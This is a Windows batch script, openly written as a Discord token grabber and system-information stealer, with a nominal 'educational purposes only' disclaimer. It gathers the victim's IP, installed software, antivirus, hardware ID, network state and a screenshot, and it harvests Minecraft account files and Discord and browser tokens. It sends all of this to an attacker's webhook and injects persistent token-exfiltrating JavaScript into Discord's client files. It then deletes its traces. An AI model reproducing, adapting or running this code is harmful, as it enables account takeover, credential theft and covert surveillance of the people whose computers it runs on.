@echo off
:: i dont take any responsibility for damage done with the programm it's for educational purposes only
::replace the YOURWEBHOOK field with your webhook
set webhook=YOURWEBHOOK

::set 1 if you want that the discord of your target get closed ( discord needs to be restarted to send you the token)
set /a killdc = 0

::get ip
curl -o %userprofile%\AppData\Local\Temp\ip.txt https://myexternalip.com/raw >NUL
set /p ip=<%userprofile%\AppData\Local\Temp\ip.txt

::gets a list of all installed programms
powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt " >NUL

::gets a list of all instaled antivirus
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List >%userprofile%\AppData\Local\Temp\antivirus.txt >NUL

::gets system informations
echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt >NUL
wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
set /p hwid=<%userprofile%\AppData\Local\Temp\uuid.txt


::gets the ipconfig (also local ip)
ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt >NUL

::gets the info about the netstat
netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt >NUL

::sends the launcher_accounts.json if minecraft exist
if exist %userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json %web% && goto end

::makes and sends a screenshot
echo $SERDO = Get-Clipboard >%userprofile%\AppData\Local\Temp\test.ps1
echo function Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
echo { >>%userprofile%\AppData\Local\Temp\test.ps1
echo     begin { >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Add-Type -AssemblyName System.Drawing, System.Windows.Forms >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Add-Type -AssemblyName System.Drawing >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() ^|  >>%userprofile%\AppData\Local\Temp\test.ps1
echo             Where-Object { $_.FormatDescription -eq "JPEG" } >>%userprofile%\AppData\Local\Temp\test.ps1
echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
echo     process { >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Start-Sleep -Milliseconds 44 >>%userprofile%\AppData\Local\Temp\test.ps1
echo             [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")    >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Start-Sleep -Milliseconds 550 >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $bitmap = [Windows.Forms.Clipboard]::GetImage()     >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $ep = New-Object Drawing.Imaging.EncoderParameters   >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)   >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture" >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep) >>%userprofile%\AppData\Local\Temp\test.ps1
echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
echo }							 >>%userprofile%\AppData\Local\Temp\test.ps1			
echo Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
echo Set-Clipboard -Value $SERDO >>%userprofile%\AppData\Local\Temp\test.ps1
echo $result  = "%webhook%"  >>%userprofile%\AppData\Local\Temp\test.ps1
echo $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture.jpg"	 >>%userprofile%\AppData\Local\Temp\test.ps1															
echo curl.exe -i -F file=@"$screenCapturePathBase" $result >>%userprofile%\AppData\Local\Temp\test.ps1
timeout 1 >NUL
Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1 && del %userprofile%\AppData\Local\Temp\test.ps1 >NUL

::sends the username, ip, current time, and date of the victim
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"User %username% : %ip% time =  %time% date = %date% os = %os% Computername = %computername% HWID = %hwid%\"}" %webhook%  >NUL


::sends all files
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\antivirus.txt %webhook% >NUL
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\System_INFO.txt %webhook% >NUL
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\sysi.txt %webhook% >NUL
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\ip.txt %webhook% >NUL
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\netstat.txt %webhook% >NUL
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\programms.txt %webhook% >NUL

::grabbs the token

echo $hook  = "%webhook%" >%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $token = new-object System.Collections.Specialized.StringCollection >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo.  >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo.  >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $db_path = @( >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Discord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Discord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Lightcord\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\discordptb\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\discordcanary\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera Stable\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Roaming\Opera Software\Opera GX Stable\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Amigo\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Torch\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Kometa\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Orbitum\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\CentBrowser\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\7Star\7Star\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Sputnik\Sputnik\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Vivaldi\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Google\Chrome SxS\User Data\Local Storage\leveldb"	 >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Epic Privacy Browser\User Data\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Google\Chrome\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\uCozMedia\Uran\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Microsoft\Edge\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\Opera Software\Opera Neon\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $env:APPDATA + "\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo ) >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1 
echo foreach ($path in $db_path) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     if (Test-Path $path) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo         foreach ($file in Get-ChildItem -Path $path -Name) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             $data = Get-Content -Path "$($path)\$($file)" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             $regex = [regex] "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}" >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             $match = $regex.Match($data) >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo            while ($match.Success) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 if (!$token.Contains($match.Value)) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                     $token.Add($match.Value) ^| out-null >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                 } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo                $match = $match.NextMatch() >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo             } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo         } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $content = ">>> ||@everyone|| **New Token** ``` " >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo foreach ($data in $token) { >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo     $content = [string]::Concat($content, "`n", $data) >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo } >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $content = [string]::Concat($content, "``` ") >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo. >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo $JSON = @{ "content"= $content;}^| convertto-json >>%userprofile%\AppData\Local\Temp\testtttt.ps1
echo Invoke-WebRequest -uri $hook -Method POST -Body $JSON -Headers @{"Content-Type" = "application/json"} >>%userprofile%\AppData\Local\Temp\testtttt.ps1
Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\testtttt.ps1

set /a app = 0 
set /a voice = 0
if exist %userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Roaming\discord\0.0.309\modules\discord_voice\index.js
:a
if exist %userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js goto b
set /a app=%app%+1
if %app% == 10 goto c
goto a
:c
set /a app=0 
set /a voice=%voice%+1 
if %voice% == 99 goto e
goto a
:b 
echo var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', '%webhook%', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}'); >>%userprofile%\AppData\Local\Discord\app-1.0.900%app%\modules\discord_voice-%voice%\discord_voice\index.js >NUL
if %killdc% == 1 goto d
goto e
:d
::coded by baum#2873
::kills discord if enabeld
taskkill /im discord.exe /f >NUL
:e



::deletes all temp files
del %userprofile%\AppData\Local\Temp\ip.txt >NUL
del %userprofile%\AppData\Local\Temp\sysi.txt >NUL
del %userprofile%\AppData\Local\Temp\System_INFO.txt >NUL
del %userprofile%\AppData\Local\Temp\netstat.txt >NUL
del %userprofile%\AppData\Local\Temp\antivirus.txt >NUL
del %userprofile%\AppData\Local\Temp\test.ps1 >NUL
del %userprofile%\AppData\Local\Temp\programms.txt >NUL
del %userprofile%\AppData\Local\Temp\%username%_Capture.jpg >NUL
del %userprofile%\AppData\Local\Temp\uuid.txt >NUL
del %userprofile%\AppData\Local\Temp\testtttt.ps1 >NUL
